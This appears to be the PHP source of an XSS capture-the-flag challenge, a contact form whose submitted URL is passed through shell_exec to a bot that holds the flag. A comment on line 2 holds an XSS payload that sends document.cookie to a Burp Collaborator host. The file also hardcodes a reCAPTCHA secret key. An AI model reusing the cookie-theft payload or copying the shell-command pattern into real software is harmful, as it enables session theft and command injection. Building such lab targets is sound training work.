<?php
//<div data-role=popup id='--> &lt;script&gt;location="http://ltix2mxazdyiych4h10pjgre85ew2l.burpcollaborator.net/?"+document.cookie&lt;/script&gt;'>


if ($_SERVER["REQUEST_METHOD"] == "POST") {
  if(isset($_POST['g-recaptcha-response'])){
    $captcha=$_POST['g-recaptcha-response'];
  }
  #if(!$captcha){
#    echo '<h2>Please check the the captcha form.</h2>';
#    header("Location: contact.php?status=bad&url=captcha_fail");
#    exit;
#  }
  $secretKey = "6LedRrsUAAAAAGwOcORwwh9l4n2P5jdEMKCX4WrO";
  $ip = $_SERVER['REMOTE_ADDR'];
  // post request to server
  $url = 'https://www.google.com/recaptcha/api/siteverify?secret=' . urlencode($secretKey) .  '&response=' . urlencode($captcha);
  $response = file_get_contents($url);
  $responseKeys = json_decode($response,true);
  // should return JSON with success as true
  if($responseKeys["success"]) {

          $flag = 'FLAG{XSS_Could_Make_You_Waste_Your_Life}';




    // Trim es una unción de php que quita todo el whitespace antes y después de una entrada
        // respeta el espacio entre palabras, solo quita espacios, tabs y enters al inicio y al final.
    $name = trim($_POST["name"]);
    $email = trim($_POST["email"]);
    $message = trim($_POST["message"]);
    $url = trim($_POST["url"]);


    if(preg_match('/(\?|\=|\#)/', $url)){
      $url_check = "bad";
    }else{
      $url_check = "OK";
      $url = escapeshellcmd($_POST["url"]);
      //shell_exec('/opt/casperjs/bin/casperjs /opt/bot.js  '.$_SERVER["HTTP_HOST"]." ".$flag." ".$url);
      shell_exec('/opt/casperjs/bin/casperjs --ignore-ssl-errors=true /opt/bot.js '.$_SERVER["HTTP_HOST"]." ".$flag." ".$url);
}
    // Validación básica de los datos de la forma de contacto.

    if ($name == "" OR $email == "" OR $message == "") {
        echo "You must specify a value for name, email address, message, and URL.";
        exit;
    }

    // Code snippet dado por nyphp para prevenir ataque "header injection exploit"
        // Verifica cada elemento de la variable post por información maliciosa
    foreach( $_POST as $value ){
        if( stripos($value,'Content-Type:') !== FALSE ){
            echo "There was a problem with the information you entered.";
            exit;
        }
    }

    // Complemento de defensa contra ataque tipo 1: inundación de correos
        // se complementa con un campo ficticio (ver más abajo)
        // Si el campo no está vacío es porque un robot lo llenó.
    if ($_POST["address"] != "") {
        echo "Your form submission has an error.";
        exit;
    }

    // Fin validación
  } else {
          echo '<h2>You are spammer !</h2>';
          header("Location: contact.php?status=bad&url=captcha_fail");
  }


    // Inicio de proceso para enviar e-mail

        // Incluir libreria 3rd party


    //header("Location: contact.php?status=thanks&url=".$url_check);
    //exit;
    // Fin proceso para enviar e-mail
}
?>

<?php

if($_GET["url"] == "bad"){
  $suspicious = "! But your link is suspicious, I'll not visit it!";
}else{
  $suspicious = " and visit your link!";
}
$pageTitle = "Contact Me";
$section = "contact";
include('inc/header.php'); ?>

    <div class="section page">

        <div class="wrapper">

            <h1>Contact</h1>

            <?php if (isset($_GET["status"]) AND $_GET["status"] == "thanks") { ?>
                <p>Thanks for the email! I&rsquo;ll be in touch shortly <?php echo($suspicious); ?></p>
            <?php } else { ?>

                <p>I&rsquo;d love to hear from you! Complete the form to send me an email.</p>

                <form method="post" action="contact.php">

                    <table>
                        <tr>
                            <th>
                                <label for="name">Name</label>
                            </th>
                            <td>
                                <input type="text" name="name" id="name">
                            </td>
                        </tr>
                        <tr>
                            <th>
                                <label for="email">Email</label>
                            </th>
                            <td>
                                <input type="text" name="email" id="email">
                            </td>
                        </tr>
                        <tr>
                            <th>
                                <label for="message">Message</label>
                            </th>
                            <td>
                                <textarea name="message" id="message"></textarea>
                            </td>
                        </tr>
                        <tr>
                            <th>
                                <label for="email">URL</label>
                            </th>
                            <td>
                                <input type="url" name="url" id="url">
                            </td>
                        </tr>
                        <tr>
                            <th>
                                <label for="email"></label>
                            </th>
                            <td>
                                <div class="g-recaptcha" data-sitekey="6LedRrsUAAAAAEvOjJlYFYWEcN4aN24owAFQ-1kw"></div>
                            </td>
                        </tr>


                    </table>

                    <input type="submit" value="Send">
                </form>

            <?php } ?>

        </div>

    </div>

<?php include('inc/footer.php') ?>
